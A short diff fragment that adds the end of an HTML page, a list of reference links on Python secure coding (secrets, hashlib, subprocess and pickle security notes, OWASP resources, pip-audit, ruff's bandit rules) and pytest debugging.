+      <li><a href="https://docs.python.org/3/library/secrets.html">secrets</a>, <a href="https://docs.python.org/3/library/hashlib.html">hashlib</a>, and <a href="https://docs.python.org/3/library/hmac.html">hmac</a></li>
+      <li><a href="https://docs.python.org/3/library/subprocess.html#security-considerations">subprocess security considerations</a> and <a href="https://docs.python.org/3/library/pickle.html">pickle's warning</a></li>
+      <li><a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> and the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">Password Storage Cheat Sheet</a></li>
+      <li><a href="https://github.com/pypa/pip-audit">pip-audit</a> and <a href="https://docs.astral.sh/ruff/rules/#flake8-bandit-s">ruff's flake8-bandit (S) rules</a></li>
+      <li><a href="https://docs.pytest.org/en/stable/how-to/failures.html">pytest: handling failures and debugging</a></li>
+    </ul>
+  </section>
+</main>
+</body>
+</html>
